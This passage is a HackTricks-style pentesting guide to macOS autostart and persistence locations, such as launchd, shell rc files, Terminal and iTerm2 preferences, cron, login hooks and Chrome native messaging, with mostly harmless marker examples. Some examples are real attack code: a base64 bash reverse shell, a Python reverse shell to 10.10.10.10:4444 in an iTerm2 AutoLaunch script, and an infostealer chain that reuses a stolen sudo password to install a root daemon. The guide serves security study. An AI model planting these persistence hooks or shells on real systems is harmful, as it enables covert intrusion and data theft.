# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

This section is heavily based on the blog series [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Its goal is to identify locations where a file write can lead to later code execution, the event that triggers execution, and the permissions required. A location's presence is not proof that the mechanism is enabled. The local checks noted below were performed on macOS 26.5.2 (5 October 2026); they do not establish behavior on every macOS release.

> [!NOTE]
> “Write-triggered” does not always mean “runs immediately after writing.” Some locations are read only at login, when a specific application starts, or when a user performs an action. A writable payload inside an already configured job is also distinct from permission to register a new job. Test in a disposable account or VM before relying on a technique.

## Sandbox Bypass

> [!TIP]
> Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** and **waiting** for a very **common** **action**, a determined **amount of time** or an **action you can usually perform** from inside a sandbox without needing root permissions.

### Launchd

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
  - **Trigger**: User login (or explicit registration)
  - Root required
- **`/Library/LaunchDaemons`**
  - **Trigger**: System boot (or explicit registration)
  - Root required
- **`/System/Library/LaunchAgents`**
  - **Trigger**: User login; protected Apple system location
- **`/System/Library/LaunchDaemons`**
  - **Trigger**: System boot; protected Apple system location
- **`~/Library/LaunchAgents`**
  - **Trigger**: Relog-in

There is no `~/Library/LaunchDaemons` location scanned by `launchd`. Per-user jobs belong in `~/Library/LaunchAgents`; the system daemon directory is `/Library/LaunchDaemons`. [Apple's launchd startup guide](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) documents the scanned locations.

> [!TIP]
> As interesting fact, **`launchd`** has an embedded property list in a the Mach-o section `__Text.__config` which contains other well known services launchd must start. Moreover, these services can contain the `RequireSuccess`, `RequireRun` and `RebootOnSuccess` that means that they must be run and complete successfully.
>
> Ofc, It cannot be modified because of code signing.

#### Description & Exploitation

**`launchd`** is the **first** **process** executed by OX S kernel at startup and the last one to finish at shut down. It should always have the **PID 1**. This process will **read and execute** the configurations indicated in the **ASEP** **plists** in:

- `/Library/LaunchAgents`: Per-user agents installed by the admin
- `/Library/LaunchDaemons`: System-wide daemons installed by the admin
- `/System/Library/LaunchAgents`: Per-user agents provided by Apple.
- `/System/Library/LaunchDaemons`: System-wide daemons provided by Apple.

When a user logs in, `launchd` loads the plists in that user's `~/Library/LaunchAgents` with that user's permissions. Jobs are started according to their keys; merely loading a plist does not imply immediate process execution.

The **main difference between agents and daemons is that agents are loaded when the user logs in and the daemons are loaded at system startup** (as there are services like ssh that needs to be executed before any user access the system). Also agents may use GUI while daemons need to run in the background.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Each `ProgramArguments` element is a separate argument; `launchd` does not parse a single string as a shell command. The corrected example above can be syntax checked without loading it using `plutil -lint /path/to/example.plist`. See the local `man launchd.plist` entry for `ProgramArguments`, `RunAtLoad`, and `KeepAlive`.

#### File-event triggers in existing jobs

An **already loaded** agent or daemon can use `WatchPaths` to start when a named path changes. `QueueDirectories` starts a job while a directory is non-empty; `StartOnMount` starts on a volume mount. [Apple's launchd guide](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) includes `WatchPaths` and `QueueDirectories` examples. A write to a watched file triggers the **job already configured**; it gives arbitrary code execution only if the writer can also control the job's executable, script, or data that the job interprets. Merely writing a new plist outside a scanned or registered location does not load it.

This self-cleaning PoC registers a uniquely named **temporary user agent**, changes only its own watched file, and removes the agent. It was run successfully on macOS 26.5.2 without a logout or restart:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

The local run printed `watch fired: True`, and `bootout` succeeded. `launchctl bootstrap` is used here only inside the isolated PoC; it is **not** needed for a job that is already loaded. To assess an existing job safely, read its plist and the resolved `ProgramArguments` path, then check whether the relevant executable or interpreted file is writable without altering it.

There are cases where an **agent needs to be executed before the user logins**, these are called **PreLoginAgents**. For example, this is useful to provide assistive technology at login. They can be found also in `/Library/LaunchAgents`(see [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) an example).

> [!TIP]
> New Daemons or Agents config files will be **loaded after next reboot or using** `launchctl load <target.plist>` It's **also possible to load .plist files without that extension** with `launchctl -F <file>` (however those plist files won't be automatically loaded after reboot).\
> It's also possible to **unload** with `launchctl unload <target.plist>` (the process pointed by it will be terminated),
>
> To **ensure** that there isn't **anything** (like an override) **preventing** an **Agent** or **Daemon** **from** **running**, run: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

List all the agents and daemons loaded by the current user:

```bash
launchctl list
```

#### Example malicious LaunchDaemon chain (password reuse)

A recent macOS infostealer reused a **captured sudo password** to drop a user agent and a root LaunchDaemon:<sup>[[1]](#references)</sup>

- Write the agent loop to `~/.agent` and make it executable.
- Generate a plist in `/tmp/starter` pointing to that agent.
- Reuse the stolen password with `sudo -S` to copy it into `/Library/LaunchDaemons/com.finder.helper.plist`, set `root:wheel`, and load it with `launchctl load`.
- Start the agent silently via `nohup ~/.agent >/dev/null 2>&1 &` to detach output.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> A daemon plist placed in `/Library/LaunchDaemons` is not made safe by giving it user ownership. `launchd` requires appropriate ownership and permissions for system jobs and may reject an insecure plist. A root-owned daemon normally runs as root unless its configuration selects another account. Check the job's `UserName`, `GroupName`, ownership, and `launchctl` diagnostics; do not infer execution identity from the plist owner's name alone.

#### More info about launchd

**`launchd`** is the **first** user mode process which is started from the **kernel**. The process start must be **successful** and it **cannot exit or crash**. It's even **protected** against some **killing signals**.

One of the first things `launchd` would do is to **start** all the **daemons** like:

- **Timer daemons** based on time to be executed:
  - atd (`com.apple.atrun.plist`): Has a `StartInterval` of 30min
  - crond (`com.apple.systemstats.daily.plist`): Has `StartCalendarInterval` to start at 00:15
- **Network daemons** like:
  - `org.cups.cups-lpd`: Listens in TCP (`SockType: stream`) with `SockServiceName: printer`
    - SockServiceName must be either a port or a service from `/etc/services`
  - `com.apple.xscertd.plist`: Listens on TCP in port 1640
- **Path daemons** that are executed when a specified path changes:
  - `com.apple.postfix.master`: Checking the path `/etc/postfix/aliases`
- **IOKit notifications daemons**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
  - `com.apple.xscertd-helper.plist`: It's indicating in the `MachServices` entry the name `com.apple.xscertd.helper`
- **UserEventAgent:**
  - This is different from the previous one. It makes launchd spawn apps in response to specific event. However, in this case, the main binary involved isn't `launchd` but `/usr/libexec/UserEventAgent`. It loads plugins from the SIP restricted folder /System/Library/UserEventPlugins/ where each plugin indicates its initialiser in the `XPCEventModuleInitializer` key or. in the case of older plugins, in the `CFPluginFactories` dict under the key `FB86416D-6164-2070-726F-70735C216EC0` of its `Info.plist`.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - But you need to find an app with a TCC bypass that executes a shell that loads these files

#### Locations

- **`~/.zshenv`** (or a newer compiled **`~/.zshenv.zwc`**)
  - **Trigger**: Any ordinary zsh invocation, including a noninteractive `zsh -c`; `zsh -f` skips user startup files.
- **`~/.zshrc`**
  - **Trigger**: Interactive zsh starts.
- **`~/.zprofile`, `~/.zlogin`**
  - **Trigger**: Login zsh starts; these are read before and after `.zshrc`, respectively.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Trigger**: Open a terminal with zsh
  - Root required
- **`~/.zlogout`**
  - **Trigger**: A login zsh exits normally, not every terminal or shell exit.
- **`/etc/zlogout`**
  - **Trigger**: Exit a terminal with zsh
  - Root required
- Potentially more in: **`man zsh`**
- **`~/.bashrc`**
  - **Trigger**: Open a terminal with bash
- `/etc/profile` (didn't work)
- `~/.profile` (didn't work)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Trigger**: Expected to trigger with xterm, but it **isn't installed** and even after installed this error is thrown: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Description & Exploitation

When initiating a shell environment such as `zsh` or `bash`, **certain startup files are run**. macOS currently uses `/bin/zsh` as the default shell. Whether Terminal or SSH starts a login or interactive shell depends on their configuration; do not assume that every file above runs in every session. While `bash` and `sh` are also present in macOS, they need to be explicitly invoked to be used.<sup>[[2]](#references)</sup> The [zsh startup-file reference](https://zsh.sourceforge.io/Doc/Release/Files.html) specifies the ordering, the `ZDOTDIR` override, and the `.zwc` rule.

The following read-only experiment used a disposable `ZDOTDIR` on macOS 26.5.2. It shows which user files were read; no real shell startup file was changed:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

The observed order was `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` must already point to the alternate directory; merely writing files in an arbitrary directory is not enough.

### Re-opened Applications

> [!CAUTION]
> Configuring the indicated exploitation and logging out and back in, or even rebooting, did not execute the app in testing. The app may need to be running when these actions are performed.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Trigger**: Restart reopening applications

#### Description & Exploitation

All the applications to reopen are inside the plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

So, make the reopen applications launch your own one, you just need to **add your app to the list**.

The UUID can be found listing that directory or with `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

To check the applications that will be reopened you can do:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

To **add an application to this list** you can use:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal Preferences

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal use to have FDA permissions of the user use it

#### Location

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Trigger**: Open Terminal

#### Description & Exploitation

In **`~/Library/Preferences`** are store the preferences of the user in the Applications. Some of these preferences can hold a configuration to **execute other applications/scripts**.<sup>[[5]](#references)</sup>

For example, the Terminal can execute a command in the Startup:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

This config is reflected in the file **`~/Library/Preferences/com.apple.Terminal.plist`** like this:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

So, if the plist of the preferences of the terminal in the system could be overwritten, the the **`open`** functionality can be used to **open the terminal and that command will be executed**.

You can add this from the cli with:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Other file extensions

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal use to have FDA permissions of the user use it

#### Location

- **Anywhere**
  - **Trigger**: Open Terminal

#### Description & Exploitation

If you create a [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) and opens, the **Terminal application** will be automatically invoked to execute the commands indicated in there. If the Terminal app has some special privileges (such as TCC), your command will be run with those special privileges.

Try it with:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```

You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.

> [!CAUTION]
> If terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a terminal window).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - You might get some extra TCC access

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
  - Root required
  - **Trigger**: Restart coreaudiod or the computer
- **`/Library/Audio/Plug-ins/Components`**
  - Root required
  - **Trigger**: Restart coreaudiod or the computer
- **`~/Library/Audio/Plug-ins/Components`**
  - **Trigger**: Restart coreaudiod or the computer
- **`/System/Library/Components`**
  - Root required
  - **Trigger**: Restart coreaudiod or the computer

#### Description

According to the previous writeups it's possible to **compile some audio plugins** and get them loaded.<sup>[[6]](#references)[[7]](#references)</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - You might get some extra TCC access

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

QuickLook plugins can be executed when you **trigger the preview of a file** (press space bar with the file selected in Finder) and a **plugin supporting that file type** is installed.<sup>[[8]](#references)</sup>

It's possible to compile your own QuickLook plugin, place it in one of the previous locations to load it and then go to a supported file and press space to trigger it.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> This didn't work for me, neither with the user LoginHook nor with the root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- You need to be able to execute something like `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  - `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

They are deprecated but can be used to execute commands when a user logs in.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

This setting is stored in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

To delete it:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

The root user one is stored in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** and **expecting not super common conditions** like specific **programs installed, "uncommon" user** actions or environments.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - However, you need to be able to execute `crontab` binary
  - Or be root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
  - Root required for direct write access. No root required if you can execute `crontab <file>`
  - **Trigger**: Depends on the cron job

#### Description & Exploitation

List the cron jobs of the **current user** with:

```bash
crontab -l
```

You can also see all the cron jobs of the users in **`/usr/lib/cron/tabs/`** and **`/var/at/tabs/`** (needs root).

In MacOS several folders executing scripts with **certain frequency** can be found in:

```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```

There you can find the regular **cron** **jobs**, the **at** **jobs** (not very used) and the **periodic** **jobs** (mainly used for cleaning temporary files). The daily periodic jobs can be executed for example with: `periodic daily`.<sup>[[10]](#references)</sup>

To add a **user cronjob programmatically** it's possible to use:

```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 use to have granted TCC permissions

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Trigger**: Open iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Trigger**: Open iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Trigger**: Open iTerm

#### Description & Exploitation

Scripts stored in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** will be executed. For example:<sup>[[11]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```

or:

```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
    async with iterm2.CustomControlSequenceMonitor(
            connection, "shared-secret", r'^create-window$') as mon:
        while True:
            match = await mon.async_get()
            await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```

The script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** will also be executed:

```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

The iTerm2 preferences located in **`~/Library/Preferences/com.googlecode.iterm2.plist`** can **indicate a command to execute** when the iTerm2 terminal is opened.

This setting can be configured in the iTerm2 settings:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

And the command is reflected in the preferences:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

You can set the command to execute with:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```

> [!WARNING]
> Highly probable there are **other ways to abuse the iTerm2 preferences** to execute arbitrary commands.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - But xbar must be installed
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - It requests Accessibility permissions

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Trigger**: Once xbar is executed

#### Description

If the popular program [**xbar**](https://github.com/matryer/xbar) is installed, it's possible to write a shell script in **`~/Library/Application\ Support/xbar/plugins/`** which will be executed when xbar is started:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - But Hammerspoon must be installed
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - It requests Accessibility permissions

#### Location

- **`~/.hammerspoon/init.lua`**
  - **Trigger**: Once hammerspoon is executed

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) serves as an automation platform for **macOS**, leveraging the **LUA scripting language** for its operations. Notably, it supports the integration of complete AppleScript code and the execution of shell scripts, enhancing its scripting capabilities significantly.<sup>[[13]](#references)</sup>

The app looks for a single file, `~/.hammerspoon/init.lua`, and when started the script will be executed.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - But BetterTouchTool must be installed
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - It requests Automation-Shortcuts and Accessibility permissions

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

This tool allows to indicate applications or scripts to execute when some shortcuts are pressed . An attacker might be able configure his own **shortcut and action to execute in the database** to make it execute arbitrary code (a shortcut could be to just to press a key).

### Alfred

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - But Alfred must be installed
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - It requests Automation, Accessibility and even Full-Disk access permissions

#### Location

- `???`

It allows to create workflows that can execute code when certain conditions are met. Potentially it's possible for an attacker to create a workflow file and make Alfred load it (it's needed to pay the premium version to use workflows).

### Visual Studio Code automatic workspace tasks

- **Write target:** `.vscode/tasks.json` inside a workspace the user will open.
- **Trigger:** Opening that workspace in VS Code, but only when the folder is trusted **and** automatic tasks have been allowed. An untrusted workspace never runs automatic tasks; the default setting prompts the user before the first automatic run. [VS Code task documentation](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) and [Workspace Trust documentation](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) describe both gates.
- **Execution identity:** The VS Code user's account, through the configured task process. This is application-specific execution, not login persistence.

In a **new, disposable workspace**, place this marker-only task in `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

After opening the trusted workspace and allowing automatic tasks, check for `.autostart-task-ran`. Remove the task entry and marker to clean up. **This was verified against Microsoft's documentation and the installed VS Code 1.139.1 bundle; it was not run in the active desktop session.**

### Chrome native messaging hosts

- **Write target:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` for the current user, or `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` for all users (admin write needed). Chromium and Chrome for Testing use different directories; see [Chrome's current path table](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Trigger:** An installed Chrome extension with the `nativeMessaging` permission calls `chrome.runtime.connectNative()` or `chrome.runtime.sendNativeMessage()` using the manifest's exact host name. Chrome then starts the host executable. Opening Chrome alone does not execute an arbitrary new native host; creating a manifest without a calling extension does nothing. [Chrome's native messaging guide](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) documents this handshake.
- **Execution identity:** The Chrome user's account. The manifest must name an absolute executable path and explicitly allow the calling extension origin.

In a disposable browser account with a test extension, the following pair of files demonstrates the write-to-execution link. The manifest's filename must match its `name`, and `TEST_EXTENSION_ID` must be replaced by that extension's actual ID:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Save this JSON as `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. The marker-only executable at the manifest's `path` can contain:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

After the test extension calls `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` from its service worker or extension page, the marker proves the host started. This minimal host does not implement Chrome's length-prefixed response protocol, so the extension may report a messaging error after the marker is written. Remove the test manifest, host, and marker to clean up. On macOS 26.5.2 the Chrome app and both manifest directories were present; **the active Chrome profile was not modified or exercised**.

### Git hooks in a local repository

